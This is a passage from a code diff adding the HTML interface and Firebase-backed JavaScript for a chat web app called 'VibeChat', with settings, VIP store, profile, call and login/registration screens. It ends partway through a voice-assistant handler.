+                    <div class="dash-card" onclick="alert('VibeChat Premium\nVersion: 3.5.2 (Latest)\nDeveloper: Rohan Vai')">
+                        <div class="card-icon" style="color:#14b8a6; background:rgba(20,184,166,0.1);"><i class="fa-solid fa-circle-info"></i></div>
+                        <div class="info-wrap"><h4>App Info & Help</h4><p>Check for updates</p></div>
+                        <i class="fa-solid fa-chevron-right" style="color:var(--text-muted); font-size:0.8rem;"></i>
+                    </div>
+                </div>
+
+                <button id="logout-btn" class="btn-danger" style="width:calc(100% - 40px); margin:10px 20px 50px; padding:18px; border-radius:20px; font-size:1.1rem;"><i class="fa-solid fa-power-off" style="margin-right:10px;"></i> LOGOUT ACCOUNT</button>
+            </div>
+        </div>
+
+        <!-- Bottom Navigation -->
+        <nav class="bottom-nav">
+            <div class="nav-item active" data-target="tab-chats" data-title="Chats">
+                <i class="fa-solid fa-message"></i><span>Chats</span>
+            </div>
+            <div class="nav-item" data-target="tab-global" data-title="Global Chat">
+                <i class="fa-solid fa-earth-americas"></i><span>Global</span>
+            </div>
+            <div class="nav-item" data-target="tab-search" data-title="Search Friends">
+                <i class="fa-solid fa-magnifying-glass"></i><span>Search</span>
+            </div>
+            <div class="nav-item" data-target="tab-profile" data-title="Profile">
+                <i class="fa-solid fa-user"></i><span>Profile</span>
+            </div>
+        </nav>
+    </div>
+
+    <!-- ADVANCED SECURITY & PRIVACY SCREEN (Messenger Style) -->
+    <div id="security-settings-screen" class="screen slide-right">
+        <header class="app-header" style="display:flex; align-items:center;">
+            <button onclick="document.getElementById('security-settings-screen').classList.remove('slide-in')" style="width:auto; background:transparent; font-size:1.5rem; color:white; margin-right:15px; padding:0; box-shadow:none;"><i class="fa-solid fa-arrow-left"></i></button>
+            <h3 style="flex:1; font-weight:700; text-align:left;">Privacy & Security</h3>
+        </header>
+        <div style="padding: 20px; overflow-y:auto; height:100%; padding-bottom:100px;">
+            <h4 style="margin: 5px 0 10px 10px; color:var(--text-muted); font-size:0.9rem;">Security Options</h4>
+            <div class="settings-group">
+                <div class="settings-item" onclick="openEditor('password')">
+                    <div class="settings-icon" style="background:rgba(234,179,8,0.1); color:#eab308;"><i class="fa-solid fa-key"></i></div>
+                    <div class="settings-text"><h4>Change Password</h4><p>Update your login password</p></div>
+                    <i class="fa-solid fa-chevron-right" style="color:var(--text-muted); font-size:0.8rem;"></i>
+                </div>
+                <div class="settings-item" onclick="alert('Two-Factor Authentication (2FA) will be available in the next major update.')">
+                    <div class="settings-icon" style="background:rgba(59,130,246,0.1); color:#3b82f6;"><i class="fa-solid fa-mobile-screen-button"></i></div>
+                    <div class="settings-text"><h4>Two-Factor Auth (2FA)</h4><p>Add an extra layer of security</p></div>
+                    <i class="fa-solid fa-chevron-right" style="color:var(--text-muted); font-size:0.8rem;"></i>
+                </div>
+                <div class="settings-item" onclick="alert('Login Activity: \n\nDevice: Currently active device\nLocation: Bangladesh\nIP: Hidden for privacy')">
+                    <div class="settings-icon" style="background:rgba(168,85,247,0.1); color:#a855f7;"><i class="fa-solid fa-laptop-code"></i></div>
+                    <div class="settings-text"><h4>Login Activity</h4><p>See where you're logged in</p></div>
+                    <i class="fa-solid fa-chevron-right" style="color:var(--text-muted); font-size:0.8rem;"></i>
+                </div>
+            </div>
+            
+            <h4 style="margin: 25px 0 10px 10px; color:var(--text-muted); font-size:0.9rem;">Privacy</h4>
+            <div class="settings-group">
+                <div class="settings-item" onclick="toggleActiveStatus()">
+                    <div class="settings-icon" style="background:rgba(34,197,94,0.1); color:#22c55e;"><i class="fa-solid fa-eye"></i></div>
+                    <div class="settings-text"><h4>Active Status</h4><p>Show when you're online</p></div>
+                    <div class="toggle-switch active" id="active-status-toggle"></div>
+                </div>
+                <div class="settings-item" onclick="document.getElementById('blocked-modal').style.display='flex';">
+                    <div class="settings-icon" style="background:rgba(239,68,68,0.1); color:#ef4444;"><i class="fa-solid fa-user-slash"></i></div>
+                    <div class="settings-text"><h4>Blocked Accounts</h4><p>Manage who can contact you</p></div>
+                    <i class="fa-solid fa-chevron-right" style="color:var(--text-muted); font-size:0.8rem;"></i>
+                </div>
+            </div>
+
+            <h4 style="margin: 25px 0 10px 10px; color:var(--text-muted); font-size:0.9rem;">Danger Zone</h4>
+            <div class="settings-group" style="border-color: rgba(239,68,68,0.3);">
+                <div class="settings-item" onclick="deleteMyAccount()">
+                    <div class="settings-icon" style="background:rgba(239,68,68,0.1); color:#ef4444;"><i class="fa-solid fa-trash"></i></div>
+                    <div class="settings-text"><h4>Delete Account</h4><p style="color:#ef4444;">Permanently delete your data</p></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- VIP Store Screen -->
+    <div id="vip-store-screen" class="screen slide-right">
+        <header class="app-header" style="display:flex; align-items:center;">
+            <button onclick="document.getElementById('vip-store-screen').classList.remove('slide-in')" style="width:auto; background:transparent; font-size:1.5rem; color:white; margin-right:15px; padding:0; box-shadow:none;"><i class="fa-solid fa-chevron-left"></i></button>
+            <h3 style="flex:1; color:var(--vip-gold); font-weight:800; letter-spacing:1px; text-align:left;">VIP STORE</h3>
+        </header>
+        <div class="vip-store-content" style="padding: 25px; overflow-y: auto; height: 100%;">
+            <div style="text-align:center; padding:20px 10px 40px;">
+                <i class="fa-solid fa-gem animate__animated animate__heartBeat animate__infinite" style="font-size:5rem; color:var(--vip-gold); margin-bottom:20px; filter:drop-shadow(0 0 20px var(--vip-glow));"></i>
+                <h2 style="font-size:1.8rem; line-height:1.2; font-weight:800;">Elevate Your Experience</h2>
+                <p style="color:var(--text-muted); font-size:0.95rem; margin-top:10px;">The ultimate status symbol on VibeChat</p>
+            </div>
+
+            <div class="vip-card" onclick="buyVIP(1, 80)" style="background: var(--bg-card); border-radius: 20px; padding: 22px; margin-bottom: 16px; border: 1px solid rgba(255,255,255,0.06); display: flex; align-items: center; justify-content: space-between; position: relative; overflow: hidden;">
+                <div><h3 style="font-size: 1.15rem; color: #fff; margin-bottom: 2px;">1 Month VIP</h3><p style="font-size: 0.75rem; color: var(--text-muted);">Standard Experience</p></div>
+                <div style="text-align:right;"><p style="font-size: 1.4rem; font-weight: 800; color: var(--vip-gold);">৳80</p></div>
+            </div>
+
+            <div class="vip-card" onclick="buyVIP(3, 210)" style="background: var(--bg-card); border-radius: 20px; padding: 22px; margin-bottom: 16px; border: 1px solid rgba(255,255,255,0.06); display: flex; align-items: center; justify-content: space-between; position: relative; overflow: hidden;">
+                <div style="position: absolute; top: 0; right: 0; background: var(--vip-gold); color: #000; padding: 3px 15px; font-size: 0.75rem; font-weight: 800; border-bottom-left-radius: 12px;">10% OFF</div>
+                <div><h3 style="font-size: 1.15rem; color: #fff; margin-bottom: 2px;">3 Months VIP</h3><p style="font-size: 0.75rem; color: var(--text-muted);">Popular Socialite</p></div>
+                <div style="text-align:right;"><p style="font-size: 1.4rem; font-weight: 800; color: var(--vip-gold);">৳210</p></div>
+            </div>
+
+            <div class="vip-card" onclick="buyVIP(12, 550)" style="background: var(--bg-card); border-radius: 20px; padding: 22px; margin-bottom: 16px; border: 2.5px solid var(--vip-gold); box-shadow: 0 0 30px rgba(255,215,0,0.15); display: flex; align-items: center; justify-content: space-between; position: relative; overflow: hidden;">
+                <div style="position: absolute; top: 0; right: 0; background: #22c55e; color: #fff; padding: 3px 15px; font-size: 0.75rem; font-weight: 800; border-bottom-left-radius: 12px;">BEST VALUE - 45% OFF</div>
+                <div><h3 style="font-size: 1.15rem; color: #fff; margin-bottom: 2px;">1 Year Legend</h3><p style="font-size: 0.75rem; color: var(--text-muted);">VIP For A Whole Year</p></div>
+                <div style="text-align:right;"><p style="font-size: 1.4rem; font-weight: 800; color: var(--vip-gold);">৳550</p></div>
+            </div>
+            
+            <p style="text-align:center; color:var(--text-muted); font-size:0.8rem; margin:30px 0 50px;">* Contact Rohan Vai on Telegram for payment completion and instant activation.</p>
+        </div>
+    </div>
+
+    <!-- View User Profile Screen (2.0) -->
+    <div id="view-profile-screen" class="screen slide-right">
+        <div class="profile-container" style="padding:0; overflow-y:auto; height:100%;">
+            <div class="cover-photo-header" style="width: 100%; height: 200px; background: #1a1a2e; position: relative;">
+                <button onclick="document.getElementById('view-profile-screen').classList.remove('slide-in')" style="position:absolute; top:25px; left:20px; z-index:10; background:rgba(0,0,0,0.6); width:45px; height:45px; border-radius:50%; color:white; border:1px solid rgba(255,255,255,0.1); cursor:pointer; backdrop-filter:blur(10px);">
+                    <i class="fa-solid fa-arrow-left"></i>
+                </button>
+                <img id="view-user-cover" src="https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=800" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.5;">
+                <img id="view-user-pfp" src="" style="width: 140px; height: 140px; border-radius: 50%; border: 6px solid var(--bg-dark); position: absolute; bottom: -70px; left: 50%; transform: translateX(-50%); z-index: 5; object-fit: cover; background: #222; box-shadow: 0 10px 25px rgba(0,0,0,0.6);">
+            </div>
+            
+            <div class="profile-info-box" style="text-align: center; margin-top: 85px; padding: 0 20px;">
+                <h2 id="view-user-name" style="font-size:2.2rem; font-weight:800; display:flex; justify-content:center; align-items:center; gap:10px;">
+                    Name 
+                    <span id="view-user-vip-badge" style="color: var(--vip-gold); margin-left: 10px; font-size: 1rem; text-shadow: 0 0 10px var(--vip-glow); display:none;"><i class="fa-solid fa-circle-check"></i></span>
+                </h2>
+                <p id="view-user-username" style="color:var(--primary-neon); font-weight:700; font-size:1.1rem; margin-top:5px;">@username</p>
+                <p id="view-user-bio" style="color:var(--text-muted); padding:20px 30px; font-size:0.95rem; line-height:1.6;">User's story goes here...</p>
+            </div>
+            
+            <div style="display: flex; justify-content: space-around; background: rgba(255,255,255,0.02); margin: 20px 15px; padding: 20px; border-radius: 20px; border: 1px solid var(--glass-border);">
+                <div style="text-align: center;">
+                    <h3 id="view-user-friends" style="font-size: 1.5rem; color: #fff;">0</h3>
+                    <p style="font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px;">Total Friends</p>
+                </div>
+                <div style="text-align: center;">
+                    <h3 id="view-user-joined" style="font-size: 1.5rem; color: #fff;">2024</h3>
+                    <p style="font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px;">Vibing Since</p>
+                </div>
+            </div>
+            
+            <div id="profile-quick-actions" style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; padding: 30px 20px; margin-top: 15px;">
+                <div onclick="msgFromProfile()" style="background: var(--bg-card); border-radius: 20px; padding: 20px 10px; text-align: center; border: 1px solid var(--glass-border); cursor: pointer;">
+                    <i class="fa-solid fa-comment-dots" style="font-size: 1.5rem; margin-bottom: 10px; display: block; color:var(--primary-neon);"></i>
+                    <span style="font-size: 0.7rem; font-weight: 700; color: var(--text-muted); text-transform: uppercase;">Message</span>
+                </div>
+                <div onclick="callFromProfile('audio')" style="background: var(--bg-card); border-radius: 20px; padding: 20px 10px; text-align: center; border: 1px solid var(--glass-border); cursor: pointer;">
+                    <i class="fa-solid fa-phone" style="font-size: 1.5rem; margin-bottom: 10px; display: block; color:#22c55e;"></i>
+                    <span style="font-size: 0.7rem; font-weight: 700; color: var(--text-muted); text-transform: uppercase;">Audio</span>
+                </div>
+                <div onclick="callFromProfile('video')" style="background: var(--bg-card); border-radius: 20px; padding: 20px 10px; text-align: center; border: 1px solid var(--glass-border); cursor: pointer;">
+                    <i class="fa-solid fa-video" style="font-size: 1.5rem; margin-bottom: 10px; display: block; color:#3b82f6;"></i>
+                    <span style="font-size: 0.7rem; font-weight: 700; color: var(--text-muted); text-transform: uppercase;">Video</span>
+                </div>
+                <div onclick="blockFromProfile()" style="background: var(--bg-card); border-radius: 20px; padding: 20px 10px; text-align: center; border: 1px solid var(--glass-border); cursor: pointer;">
+                    <i class="fa-solid fa-user-slash" style="font-size: 1.5rem; margin-bottom: 10px; display: block; color:#ef4444;"></i>
+                    <span style="font-size: 0.7rem; font-weight: 700; color: var(--text-muted); text-transform: uppercase;">Block</span>
+                </div>
+            </div>
+            
+            <button class="btn-danger" id="report-user-btn" style="width:calc(100% - 40px); margin:0 20px 50px; padding:18px; border-radius:20px; font-weight:700;">
+                <i class="fa-solid fa-flag" style="margin-right:10px;"></i> REPORT THIS ACCOUNT
+            </button>
+        </div>
+    </div>
+
+    <!-- Private Chat Room Screen -->
+    <div id="chat-room-screen" class="screen slide-right">
+        <header class="chat-header">
+            <button id="back-to-chats"><i class="fa-solid fa-arrow-left"></i></button>
+            
+            <!-- MESSENGER STYLE CLICKABLE HEADER -->
+            <div class="chat-header-user" onclick="viewUserProfile(currentChatFriendId)">
+                <img id="active-chat-pfp" src="">
+                <div style="flex:1;">
+                    <h3 id="active-chat-name" style="font-size: 1.15rem; line-height:1.2; font-weight:700; display:flex; align-items:center;">
+                        Friend <span id="active-chat-status" class="online-dot"></span>
+                    </h3>
+                    <p id="active-chat-typing" style="font-size:0.75rem; color:var(--primary-neon); height:15px; font-weight:500;"></p>
+                </div>
+            </div>
+
+            <button onclick="initPrivateCall('audio')" style="color:var(--primary-neon); margin-right:15px; font-size:1.3rem;"><i class="fa-solid fa-phone"></i></button>
+            <button onclick="initPrivateCall('video')" style="color:var(--primary-neon); margin-right:15px; font-size:1.3rem;"><i class="fa-solid fa-video"></i></button>
+            <button id="block-user-btn" style="color:var(--text-muted); margin-right:0;"><i class="fa-solid fa-circle-info"></i></button>
+        </header>
+        
+        <div class="messages-container" id="private-messages-container"></div>
+        
+        <div class="chat-input-area" id="private-input-area">
+            <label for="chat-image-upload" class="icon-btn"><i class="fa-solid fa-circle-plus"></i></label>
+            <input type="file" id="chat-image-upload" accept="image/*" style="display:none;">
+            
+            <input type="text" id="private-message-input" placeholder="Message...">
+            
+            <button id="chat-mic-btn" class="icon-btn" style="color:#ef4444;"><i class="fa-solid fa-microphone"></i></button>
+            <button id="private-send-btn" class="btn-primary" style="width:50px; height:50px;"><i class="fa-solid fa-paper-plane"></i></button>
+        </div>
+        
+        <div class="blocked-banner" id="blocked-banner">
+            <p id="blocked-msg-text">You cannot reply to this conversation.</p>
+            <button id="unblock-action-btn" class="btn-secondary" style="margin-top:10px; padding:12px; border-radius:15px;">Unblock</button>
+        </div>
+    </div>
+
+    <!-- Full Screen Editor -->
+    <div id="full-editor-screen" class="screen slide-right">
+        <header class="app-header" style="display:flex; align-items:center;">
+            <button onclick="document.getElementById('full-editor-screen').classList.remove('slide-in')" style="width:auto; background:transparent; font-size:1.5rem; color:white; margin-right:15px; padding:0; box-shadow:none;"><i class="fa-solid fa-arrow-left"></i></button>
+            <h3 id="editor-header-title" style="flex:1; font-weight:700; text-align:left;">Edit Details</h3>
+        </header>
+        <div class="editor-content" style="padding: 30px 20px;">
+            <p class="editor-title" id="editor-label" style="color:var(--text-muted); font-weight:500;">Enter new information:</p>
+            <input type="text" id="editor-input" placeholder="Type here..." style="width:100%; padding:20px; font-size:1.1rem; border-radius:20px; margin-bottom:30px; background:rgba(0,0,0,0.5); color:white; border:1px solid rgba(255,255,255,0.1); outline:none; box-sizing:border-box;">
+            <button id="editor-save-btn" class="btn-primary" style="padding:20px; border-radius:20px; font-size:1.1rem;">Save Changes</button>
+        </div>
+    </div>
+
+    <!-- Random Video Chat Screen (Global) -->
+    <div id="video-chat-screen" class="screen slide-right">
+        <div class="video-container">
+            <video id="remote-video" autoplay playsinline></video>
+            <video id="local-video" autoplay muted playsinline></video>
+            <p id="video-status" class="video-overlay-text">Connecting to global server...</p>
+            <div class="video-controls">
+                <button class="video-btn btn-end" onclick="endVideoChat()"><i class="fa-solid fa-phone-slash"></i></button>
+                <button class="video-btn btn-skip" onclick="skipAndFindNew()"><i class="fa-solid fa-forward-step" style="margin-right:10px;"></i> Skip Match</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Private Video/Audio Chat Screen -->
+    <div id="private-video-screen" class="screen slide-in" style="display:none; background:#000; z-index:900;">
+        <div class="video-container">
+            <p id="pvt-call-timer" class="call-timer" style="display:none;">00:00</p>
+            <video id="pvt-remote-video" autoplay playsinline></video>
+            <video id="pvt-local-video" autoplay muted playsinline></video>
+            <img id="pvt-audio-avatar" class="audio-pulse-avatar" src="">
+            <p id="pvt-video-status" class="video-overlay-text">Calling...</p>
+            <div class="video-controls">
+                <button class="video-btn btn-end" onclick="endPrivateCall()" style="width:75px; height:75px; font-size:2rem;"><i class="fa-solid fa-phone-slash"></i></button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Incoming Call Modal -->
+    <div id="incoming-call-modal" class="screen" style="display:none; flex-direction:column; justify-content:center; align-items:center; text-align:center; background: rgba(5, 5, 8, 0.98); z-index: 1000;">
+        <h2 style="margin-bottom: 20px; color:var(--text-muted); font-weight: 600; letter-spacing:2px; text-transform:uppercase;">Incoming <span id="incoming-call-type">Video</span> Call</h2>
+        <img id="incoming-caller-pfp" class="caller-pfp" src="" style="width:120px; height:120px; border-radius:50%; margin-bottom:20px; border:4px solid var(--primary-neon);">
+        <h1 id="incoming-caller-name" style="font-size: 2.5rem; font-weight:800; margin-bottom:10px;">Caller Name</h1>
+        <p style="color:var(--primary-neon);">VibeChat Secure Call</p>
+        <div class="call-actions" style="margin-top: 60px;">
+            <button class="call-btn btn-reject" onclick="rejectPrivateCall()" style="background:#ef4444; color:white; border:none; width:70px; height:70px; border-radius:50%; font-size:1.8rem; margin-right:20px; cursor:pointer;"><i class="fa-solid fa-phone-slash"></i></button>
+            <button class="call-btn btn-accept" onclick="acceptPrivateCall()" style="background:#22c55e; color:white; border:none; width:70px; height:70px; border-radius:50%; font-size:1.8rem; cursor:pointer;"><i class="fa-solid fa-phone"></i></button>
+        </div>
+    </div>
+
+    <!-- Modals & Bottom Sheets -->
+    <div class="modal-overlay" id="blocked-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 style="font-weight:800;">Blocked Users</h3>
+                <button class="modal-close" onclick="document.getElementById('blocked-modal').style.display='none'"><i class="fa-solid fa-xmark"></i></button>
+            </div>
+            <div id="blocked-users-list" style="max-height: 60vh; overflow-y: auto;"></div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="msg-options-overlay" onclick="closeMsgOptions()"></div>
+    <div class="bottom-sheet" id="msg-options-sheet">
+        <div class="sheet-handle"></div>
+        <button class="sheet-action" onclick="copyMessage()"><i class="fa-regular fa-copy" style="font-size:1.3rem;"></i> Copy Message Text</button>
+        <button class="sheet-action" id="edit-msg-btn" onclick="openMsgEditor()"><i class="fa-solid fa-pen" style="font-size:1.3rem;"></i> Edit Sent Message</button>
+    </div>
+
+    <div class="modal-overlay" id="edit-msg-modal">
+        <div class="modal-content">
+            <h3 style="margin-bottom: 20px; font-weight:800;">Edit Message</h3>
+            <input type="text" id="edit-msg-input" style="padding:18px; border-radius:16px; width:100%; border:1px solid rgba(255,255,255,0.1); background:rgba(0,0,0,0.5); color:white; outline:none;">
+            <div style="display:flex; gap:15px; margin-top:20px;">
+                <button class="btn-secondary" onclick="document.getElementById('edit-msg-modal').style.display='none'">Cancel</button>
+                <button class="btn-primary" onclick="saveEditedMessage()">Update Message</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==========================================
+         JAVASCRIPT ENGINE (Firebase & App Logic)
+         ========================================== -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.1/firebase-database-compat.js"></script>
+
+    <script>
+        // 🔴 Firebase Configuration
+        const firebaseConfig = {
+          apiKey: "AIzaSyA0zJgtmiC9U3W33umTIxnMMJ5yILfFiXQ",
+          authDomain: "vibe-chat-49c0c.firebaseapp.com",
+          databaseURL: "https://vibe-chat-49c0c-default-rtdb.firebaseio.com",
+          projectId: "vibe-chat-49c0c",
+          messagingSenderId: "195737718974",
+          appId: "1:195737718974:web:1a1e00974a1e33f5868eef"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth(); 
+        const db = firebase.database();
+
+        // Core Global Variables
+        let currentUser = null;
+        let currentChatFriendId = null;
+        let currentChatId = null;
+        let activeMsgId = null;
+        let activeMsgText = "";
+        let activeMsgType = "";
+        let typingTimer;
+        let mediaRecorder;
+        let audioChunks = [];
+        
+        let isAppInit = false; 
+
+        // DRAGGABLE AI ROBOT LOGIC (Optimized for Web/Mobile click vs drag)
+        const aiTrigger = document.getElementById('vibe-ai-trigger');
+        let isDragging = false;
+        let startX, startY, initialX, initialY;
+
+        const dragStart = (e) => {
+            initialX = aiTrigger.offsetLeft;
+            initialY = aiTrigger.offsetTop;
+            startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
+            startY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
+            isDragging = false;
+            
+            if (e.type.includes('mouse')) {
+                document.addEventListener('mousemove', dragMove);
+                document.addEventListener('mouseup', dragEnd);
+            } else {
+                document.addEventListener('touchmove', dragMove, {passive: false});
+                document.addEventListener('touchend', dragEnd);
+            }
+        };
+
+        const dragMove = (e) => {
+            let currentX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
+            let currentY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
+            
+            let diffX = currentX - startX;
+            let diffY = currentY - startY;
+            
+            if (Math.abs(diffX) > 5 || Math.abs(diffY) > 5) {
+                isDragging = true;
+            }
+
+            if (!isDragging) return;
+
+            e.preventDefault(); 
+            aiTrigger.style.left = (initialX + diffX) + 'px';
+            aiTrigger.style.top = (initialY + diffY) + 'px';
+            aiTrigger.style.bottom = 'auto'; 
+            aiTrigger.style.right = 'auto'; 
+        };
+
+        const dragEnd = (e) => {
+            document.removeEventListener('mousemove', dragMove);
+            document.removeEventListener('mouseup', dragEnd);
+            document.removeEventListener('touchmove', dragMove);
+            document.removeEventListener('touchend', dragEnd);
+        };
+
+        aiTrigger.addEventListener('mousedown', dragStart);
+        aiTrigger.addEventListener('touchstart', dragStart, {passive: false});
+
+        // Audio System
+        function playSound(type) {
+            try {
+                if(type === 'msg') document.getElementById('msg-sound').play().catch(e=>{});
+                if(type === 'ring') document.getElementById('ring-sound').play().catch(e=>{});
+            } catch(error) {}
+        }
+        function stopSound() { 
+            try {
+                const ring = document.getElementById('ring-sound');
+                ring.pause(); ring.currentTime = 0; 
+            } catch(e) {}
+        }
+
+        function formatTime(timestamp) {
+            if(!timestamp) return ""; 
+            const date = new Date(timestamp); 
+            const today = new Date();
+            let hours = date.getHours();
+            let minutes = date.getMinutes(); 
+            const ampm = hours >= 12 ? 'PM' : 'AM';
+            hours = hours % 12; 
+            hours = hours ? hours : 12; 
+            minutes = minutes < 10 ? '0' + minutes : minutes; 
+            const timeStr = hours + ':' + minutes + ' ' + ampm;
+            const isToday = date.getDate() === today.getDate() && date.getMonth() === today.getMonth() && date.getFullYear() === today.getFullYear();
+            if(isToday) return 'Today, ' + timeStr;
+            else return date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }) + ', ' + timeStr;
+        }
+
+        function toggleAuth(type) { 
+            document.getElementById('login-form').style.display = type === 'login' ? 'block' : 'none'; 
+            document.getElementById('register-form').style.display = type === 'register' ? 'block' : 'none'; 
+        }
+
+        const navItems = document.querySelectorAll('.nav-item');
+        navItems.forEach(item => {
+            item.addEventListener('click', () => {
+                navItems.forEach(nav => nav.classList.remove('active')); 
+                document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+                
+                item.classList.add('active'); 
+                document.getElementById(item.dataset.target).classList.add('active'); 
+                document.getElementById('header-title').innerText = item.dataset.title;
+                
+                if(item.dataset.target === 'tab-global') {
+                    const globalTab = document.getElementById('tab-global');
+                    globalTab.scrollTop = globalTab.scrollHeight;
+                }
+            });
+        });
+
+        document.getElementById('back-to-chats').addEventListener('click', () => { 
+            document.getElementById('chat-room-screen').classList.remove('slide-in'); 
+            if(currentChatId && currentUser) {
+                db.ref('chats/'+currentChatId+'/typing/'+currentUser.uid).remove();
+            }
+            currentChatId = null; 
+            currentChatFriendId = null;
+        });
+
+        // ==========================================
+        // AUTHENTICATION & INITIALIZATION
+        // ==========================================
+        let isActiveStatusEnabled = true;
+
+        auth.onAuthStateChanged(user => {
+            setTimeout(() => { document.getElementById('splash-screen').style.display = 'none'; }, 2500);
+            
+            if(user) {
+                db.ref('.info/connected').on('value', snap => {
+                    if (snap.val() === true && isActiveStatusEnabled) {
+                        const statusRef = db.ref('users/' + user.uid + '/status');
+                        statusRef.onDisconnect().set('offline'); 
+                        statusRef.set('online');
+                    }
+                });
+
+                db.ref('users/' + user.uid).on('value', snap => {
+                    if(snap.exists()){
+                        currentUser = snap.val();
+                        document.getElementById('auth-screen').classList.remove('active'); 
+                        document.getElementById('main-screen').classList.add('active');
+                        
+                        document.getElementById('my-name').innerHTML = `${currentUser.name} <span id="my-vip-badge-main" class="verified-badge" style="display:${currentUser.isVIP ? 'inline-block' : 'none'};"><i class="fa-solid fa-circle-check"></i></span>`;
+                        document.getElementById('my-username').innerText = currentUser.username;
+                        document.getElementById('my-pfp').src = currentUser.pfp || "";
+                        document.getElementById('my-cover').src = currentUser.cover || "https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=1000";
+                        document.getElementById('my-bio').innerText = currentUser.bio || "Hey there! I am using VibeChat Premium.";
+                        
+                        if(currentUser.isVIP) {
+                            const mainAd = document.getElementById('main-ad-banner');
+                            if(mainAd) mainAd.style.display = 'none';
+                            
+                            const chatAd = document.getElementById('chat-ad-banner');
+                            if(chatAd) chatAd.style.display = 'none';
+                            
+                            document.getElementById('my-vip-status').style.display = 'inline-flex';
+                        }
+                        
+                        if(!isAppInit) {
+                            loadFriendRequests(); 
+                            loadChatList(); 
+                            loadGlobalChat(); 
+                            listenForIncomingCalls();
+                            isAppInit = true;
+                        }
+                    }
+                });
+            } else { 
+                document.getElementById('main-screen').classList.remove('active'); 
+                document.getElementById('auth-screen').classList.add('active'); 
+                isAppInit = false; 
+            }
+        });
+
+        document.getElementById('register-btn').addEventListener('click', async () => {
+            const fullName = document.getElementById('reg-fullname').value.trim(); 
+            let username = document.getElementById('reg-username').value.trim().toLowerCase();
+            const email = document.getElementById('reg-email').value.trim();
+            const pass = document.getElementById('reg-password').value.trim();
+            
+            if(!fullName || !username || !email || !pass) return alert("All fields are required!"); 
+            if(!username.startsWith('@')) username = '@' + username; 
+            if(pass.length < 6) return alert("Password must be at least 6 characters.");
+            
+            const btn = document.getElementById('register-btn'); 
+            btn.innerText = "Creating Profile...";
+            
+            try {
+                const userCred = await auth.createUserWithEmailAndPassword(email, pass);
+                const user = userCred.user;
+                
+                await new Promise(r => setTimeout(r, 1200)); 
+                
+                const userSnap = await db.ref('usernames/' + username).once('value'); 
+                if(userSnap.exists()) { 
+                    await user.delete(); 
+                    btn.innerText = "Create Account"; 
+                    return alert("Username already taken! Try another one."); 
+                }
+                
+                const defaultPfp = `https://ui-avatars.com/api/?name=${fullName.charAt(0)}&background=a855f7&color=fff&size=256`;
+                
+                await db.ref('users/' + user.uid).set({ 
+                    uid: user.uid, 
+                    email: email, 
+                    username: username, 
+                    name: fullName, 
+                    pfp: defaultPfp, 
+                    cover: "", 
+                    bio: "Hey there! I am using VibeChat.", 
+                    status: "online", 
+                    isVIP: false, 
+                    joinedAt: Date.now() 
+                });
+                
+                await db.ref('usernames/' + username).set(user.uid);
+            } catch (err) { 
+                alert(err.message); 
+                btn.innerText = "Create Account"; 
+            }
+        });
+
+        document.getElementById('login-btn').addEventListener('click', () => {
+            const email = document.getElementById('login-email').value.trim();
+            const pass = document.getElementById('login-password').value.trim();
+            
+            if(!email || !pass) return alert("Email and Password needed!"); 
+            
+            document.getElementById('login-btn').innerText = "Authenticating...";
+            auth.signInWithEmailAndPassword(email, pass).catch(err => { 
+                alert(err.message); 
+                document.getElementById('login-btn').innerText = "Sign In"; 
+            });
+        });
+
+        document.getElementById('logout-btn').addEventListener('click', () => {
+            if(confirm("Are you sure you want to logout?")) {
+                db.ref('users/' + currentUser.uid + '/status').set('offline').then(() => {
+                    auth.signOut().then(() => location.reload());
+                });
+            }
+        });
+
+        // ==========================================
+        // SETTINGS & ADVANCED SECURITY FUNCTIONS
+        // ==========================================
+        window.toggleActiveStatus = () => {
+            const toggle = document.getElementById('active-status-toggle');
+            isActiveStatusEnabled = !isActiveStatusEnabled;
+            
+            if(isActiveStatusEnabled) {
+                toggle.classList.add('active');
+                db.ref('users/' + currentUser.uid + '/status').set('online');
+            } else {
+                toggle.classList.remove('active');
+                db.ref('users/' + currentUser.uid + '/status').set('offline');
+            }
+        };
+
+        window.deleteMyAccount = async () => {
+            if(confirm("WARNING: This action is irreversible. All your messages, friends, and data will be permanently deleted. Do you really want to delete your account?")) {
+                if(confirm("Are you absolutely sure?")) {
+                    try {
+                        await db.ref('users/' + currentUser.uid).remove();
+                        await auth.currentUser.delete();
+                        alert("Your account has been deleted.");
+                        location.reload();
+                    } catch(e) {
+                        alert("Security constraint: Please logout and login again to verify your identity before deleting your account.");
+                    }
+                }
+            }
+        };
+
+        // ==========================================
+        // VIBE AI: 500+ COMMANDS LOGIC ENGINE
+        // ==========================================
+        const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+        let recognition = null;
+        if(SpeechRecognition) {
+            recognition = new SpeechRecognition();
+            recognition.lang = 'en-US'; 
+            recognition.continuous = false;
+        }
+        
+        const synth = window.speechSynthesis;
+
+        aiTrigger.addEventListener('click', () => {
+            if(isDragging) { isDragging = false; return; } 
+            if(!recognition) {
+                alert("আপনার ব্রাউজারটি এআই সাপোর্ট করে না। দয়া করে গুগল ক্রোম ব্যবহার করুন।");
+                return;
+            }
+            
+            aiTrigger.style.borderColor = "#0df"; 
